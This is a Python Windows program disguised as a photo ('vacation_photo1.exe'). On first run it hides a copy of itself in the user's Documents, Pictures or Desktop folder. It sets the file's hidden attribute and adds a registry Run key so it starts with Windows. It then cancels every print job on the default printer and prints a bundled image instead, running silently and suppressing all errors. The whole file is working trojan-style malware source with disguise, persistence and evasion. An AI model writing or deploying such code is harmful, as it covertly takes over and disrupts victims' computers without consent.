import os
import sys
import shutil
import winreg
import random
import threading
import subprocess
import tempfile
import time
from pathlib import Path
from PIL import Image
import win32print
import win32api

# ── CONFIG ────────────────────────────────────────────────────────────────────
SCRIPT_NAME = "vacation_photo1"
HIDE_FOLDERS = [
    Path.home() / "Documents",
    Path.home() / "Pictures",
    Path.home() / "Desktop",
]
STARTUP_REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "vacation_photo1"

# ── FIND him.jpg BUNDLED WITH EXE ─────────────────────────────────────────────
def get_him_jpg():
    # PyInstaller bundles files into a temp folder at runtime
    if hasattr(sys, "_MEIPASS"):
        return Path(sys._MEIPASS) / "him.jpg"
    # Running as raw .py during dev
    return Path(__file__).parent / "him.jpg"

# ── SELF RELOCATION ───────────────────────────────────────────────────────────
def get_install_path():
    folder = random.choice(HIDE_FOLDERS)
    return folder / f"{SCRIPT_NAME}.exe"

def is_installed():
    install_path = get_install_path()
    # Check all three possible locations
    for folder in HIDE_FOLDERS:
        candidate = folder / f"{SCRIPT_NAME}.exe"
        if candidate.exists():
            return candidate
    return None

def install_self():
    """Copy the exe to a random folder and add to startup."""
    exe_path = Path(sys.executable)
    install_path = get_install_path()

    # Copy exe
    shutil.copy2(exe_path, install_path)

    # Hide the file attribute (won't show in normal folder view)
    import ctypes
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(str(install_path), FILE_ATTRIBUTE_HIDDEN)

    # Add to startup registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ, str(install_path))
        winreg.CloseKey(key)
    except Exception:
        pass

# ── PRINT INTERCEPTION ────────────────────────────────────────────────────────
def get_image_size(filepath):
    """Try to get pixel dimensions of an image file."""
    try:
        with Image.open(filepath) as img:
            return img.size  # (width, height)
    except Exception:
        return None

def prepare_him(original_path):
    """
    Return a path to him.jpg, resized to match original if it's an image.
    Returns a temp file path.
    """
    him_path = get_him_jpg()
    size = get_image_size(original_path)

    tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
    tmp.close()

    if size:
        # Resize him.jpg to match original image dimensions
        with Image.open(him_path) as img:
            resized = img.resize(size, Image.LANCZOS)
            resized.save(tmp.name, "JPEG")
    else:
        # Not an image, just use him.jpg as-is
        shutil.copy2(him_path, tmp.name)

    return tmp.name

def intercept_print(original_file):
    """
    Replace the file being printed with him.jpg for the duration of the print dialog.
    """
    him_temp = prepare_him(original_file)

    try:
        # Open the print dialog with him.jpg instead
        win32api.ShellExecute(
            0,
            "print",
            him_temp,
            None,
            ".",
            0
        )
    finally:
        # Small delay then clean up temp file
        def cleanup():
            time.sleep(30)
            try:
                os.unlink(him_temp)
            except Exception:
                pass
        threading.Thread(target=cleanup, daemon=True).start()

# ── PRINT MONITOR HOOK ────────────────────────────────────────────────────────
# We hook into Windows print spooler by watching for new print jobs
# and cancelling them, then resubmitting with him.jpg

class PrintMonitor:
    def __init__(self):
        self.running = True
        self.seen_jobs = set()

    def get_print_jobs(self):
        jobs = []
        try:
            printer_name = win32print.GetDefaultPrinter()
            handle = win32print.OpenPrinter(printer_name)
            job_list = win32print.EnumJobs(handle, 0, 99, 1)
            for job in job_list:
                jobs.append({
                    "id": job["JobId"],
                    "printer": printer_name,
                    "handle": handle,
                    "document": job.get("pDocument", ""),
                    "datatype": job.get("pDatatype", ""),
                })
        except Exception:
            pass
        return jobs

    def cancel_job(self, printer_name, job_id):
        try:
            handle = win32print.OpenPrinter(printer_name)
            win32print.SetJob(handle, job_id, 0, None, win32print.JOB_CONTROL_DELETE)
            win32print.ClosePrinter(handle)
        except Exception:
            pass

    def run(self):
        him_path = get_him_jpg()
        while self.running:
            try:
                jobs = self.get_print_jobs()
                for job in jobs:
                    job_id = job["id"]
                    if job_id not in self.seen_jobs:
                        self.seen_jobs.add(job_id)
                        # Cancel the real job
                        self.cancel_job(job["printer"], job_id)
                        # Submit him.jpg instead
                        threading.Thread(
                            target=self.submit_him,
                            args=(job["printer"], him_path),
                            daemon=True
                        ).start()
            except Exception:
                pass
            time.sleep(0.5)

    def submit_him(self, printer_name, him_path):
        try:
            time.sleep(0.3)
            win32api.ShellExecute(0, "print", str(him_path), f'"{printer_name}"', ".", 0)
        except Exception:
            pass

# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    already_installed = is_installed()

    if not already_installed:
        # First run — install self
        install_self()

    # Start the print monitor in background
    monitor = PrintMonitor()
    monitor_thread = threading.Thread(target=monitor.run, daemon=True)
    monitor_thread.start()

    # Keep alive silently
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()